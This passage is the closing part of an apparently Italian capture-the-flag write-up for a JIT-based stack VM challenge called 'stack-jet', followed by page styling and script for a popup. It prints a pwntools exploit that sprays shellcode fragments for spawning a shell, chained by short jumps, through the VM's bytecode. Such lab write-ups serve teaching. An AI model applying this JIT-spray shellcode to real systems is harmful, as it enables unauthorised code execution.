SHELLCODE_BLOCCO[14] = b"\x90\x90\x90\xb0\x62\x90\xeb\x03"
SHELLCODE_BLOCCO[15] = b"\x90\x90\x90\x48\xd3\xe0\xeb\x03"
SHELLCODE_BLOCCO[16] = b"\x90\x90\x90\xb0\x2f\x50\xeb\x03"
SHELLCODE_BLOCCO[17] = b"\x90\x90\x90\x48\x31\xc0\xeb\x03"
SHELLCODE_BLOCCO[18] = b"\x90\x90\x90\x54\x5f\x90\xeb\x03"
SHELLCODE_BLOCCO[19] = b"\x90\x90\x90\xb0\x3b\x90\xeb\x03"
SHELLCODE_BLOCCO[20] = b"\x90\x90\x90\x0f\x05\xc3\x90\x90"

OFFSET = 42

bytecode = b""
bytecode += OP_PUSH + p64(0)
bytecode += OP_SWAP
bytecode += OP_PUSH + p64(OFFSET)
bytecode += OP_ADD
for i in range(21):
    bytecode += OP_PUSH + SHELLCODE_BLOCCO[i]
for i in range(21):
    bytecode += OP_POP
bytecode += OP_SWAP

p = process("./stack-jet")
# context.log_level = 'debug'
#gdb.attach(p, gdbscript ="""
#    b jit_run
#    c
#""")

p.sendlineafter(b"Number of arguments: ", b"0")
p.sendlineafter(b"Code size: ", str(len(bytecode)))

# print(f"LENGTH: {len(bytecode)}")
p.send(bytecode)

p.interactive()
```

> üí≠ Se hai bisogno di chiarimenti scrivimi pure su discord: *m9b3\_0b20ck*.

<style>
  .star-alert {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.8);
    backdrop-filter: blur(5px);
    z-index: 10000;
    display: flex;
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.5s ease-out;
    transition: all 0.3s ease;
  }
  
  .star-alert.hidden {
    animation: fadeOut 0.3s ease-in forwards;
  }
  
  .star-alert-content {
    background: linear-gradient(135deg, #64ffda, #4cd3a7);
    color: #252a34;
    padding: 2rem 2.5rem;
    border-radius: 20px;
    box-shadow: 0 20px 60px rgba(100, 255, 218, 0.4);
    max-width: 400px;
    width: 90%;
    text-align: center;
    position: relative;
    transform: scale(0.8);
    animation: popIn 0.5s ease-out 0.2s forwards;
  }
  
  .star-icon {
    font-size: 3em;
    display: block;
    margin-bottom: 1rem;
    animation: sparkle 2s infinite;
  }
  
  .star-text {
    font-weight: 600;
    font-size: 1.1em;
    margin-bottom: 1.5rem;
    line-height: 1.4;
  }
  
  .star-button {
    background: #252a34;
    color: #64ffda;
    padding: 12px 24px;
    border-radius: 12px;
    text-decoration: none;
    font-weight: bold;
    font-size: 1em;
    transition: all 0.3s ease;
    border: 3px solid transparent;
    display: inline-block;
    margin-bottom: 1rem;
  }
  
  .star-button:hover {
    background: #1a1e25;
    border-color: #252a34;
    transform: translateY(-3px);
    box-shadow: 0 8px 25px rgba(37, 42, 52, 0.4);
  }
  
  .close-button {
    position: absolute;
    top: 15px;
    right: 20px;
    background: rgba(37, 42, 52, 0.1);
    border: none;
    font-size: 1.8em;
    cursor: pointer;
    color: #252a34;
    opacity: 0.7;
    transition: all 0.3s ease;
    padding: 5px;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  .close-button:hover {
    opacity: 1;
    background: rgba(37, 42, 52, 0.2);
    transform: rotate(90deg);
  }
  
  @keyframes fadeIn {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }
  
  @keyframes fadeOut {
    from {
      opacity: 1;
    }
    to {
      opacity: 0;
    }
  }
  
  @keyframes popIn {
    from {
      transform: scale(0.8);
      opacity: 0;
    }
    to {
      transform: scale(1);
      opacity: 1;
    }
  }
  
  @keyframes sparkle {
    0%, 100% {
      transform: scale(1) rotate(0deg);
    }
    25% {
      transform: scale(1.1) rotate(-5deg);
    }
    50% {
      transform: scale(1.2) rotate(0deg);
    }
    75% {
      transform: scale(1.1) rotate(5deg);
    }
  }
  
  /* Mobile responsive */
  @media (max-width: 768px) {
    .star-alert-content {
      padding: 1.5rem 2rem;
      margin: 1rem;
    }
    
    .star-icon {
      font-size: 2.5em;
    }
    
    .star-text {
      font-size: 1em;
    }
    
    .star-button {
      padding: 10px 20px;
      font-size: 0.9em;
    }
  }
</style>

<script>
(function() {
  const STORAGE_KEY = 'star-alert-dismissed';
  const SHOW_DELAY = 5000; // 5 seconds after page load
  
  function showStarAlert() {
    // Check if user has already dismissed the alert
    // if (localStorage.getItem(STORAGE_KEY) === 'true') {
    //   return;
    // }
    
    const alert = document.getElementById('star-alert');
    const closeButton = document.getElementById('close-star-alert');
    
    if (!alert || !closeButton) return;
    
    // Show alert after delay
    setTimeout(() => {
      alert.style.display = 'block';
    }, SHOW_DELAY);
    
    // Handle close button
    closeButton.addEventListener('click', function() {
      alert.classList.add('hidden');
      localStorage.setItem(STORAGE_KEY, 'true');
      
      setTimeout(() => {
        alert.style.display = 'none';
      }, 300);
    });
    
    // Auto-hide after 10 seconds if not interacted with
    setTimeout(() => {
      if (alert.style.display !== 'none' && !alert.classList.contains('hidden')) {
        alert.classList.add('hidden');
        setTimeout(() => {
          alert.style.display = 'none';
        }, 300);
      }
    }, 15000);
  }
  
  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', showStarAlert);
  } else {
    showStarAlert();
  }
})();
</script>
